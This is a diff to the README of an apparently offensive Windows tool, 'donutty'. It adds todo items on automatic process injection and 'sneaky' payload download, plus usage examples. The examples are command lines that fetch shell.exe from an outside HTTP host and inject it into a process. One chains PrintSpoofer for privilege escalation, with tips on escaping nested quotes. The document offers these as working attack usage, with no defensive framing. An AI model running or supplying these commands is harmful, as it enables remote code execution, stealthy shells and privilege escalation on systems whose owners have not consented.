@@ -17,4 +17,13 @@ Todo:
 <br>
 [-] Figure a fix to python/go or any way to not have to utilize wine 
 <br>
+[-] Add an option to select process by name and automatically inject (for process injection)
+<br>
 [-] Implement SSL to make payload download more sneaky?
+
+Examples:
+<br>
+`donutty.exe /m:1 /f:shell.exe /url:http://10.0.0.90:8081 /pid:1`
+<br>
+`donutty.exe /m:2 /f:PrintSpoofer.exe /url:http://10.0.0.90:8081 /p:"-c \"\\donutty.exe /m:2 /f:shell.exe /url:http://10.0.0.90:8081 /b:\"C:\windows\system32\cmd.exe\" " /b:"C:\windows\system32\cmd.exe"`
+*note if using an exe that has quotes in its own args, like printspoofer: you have to escape the quotes within like above. same with calling from path
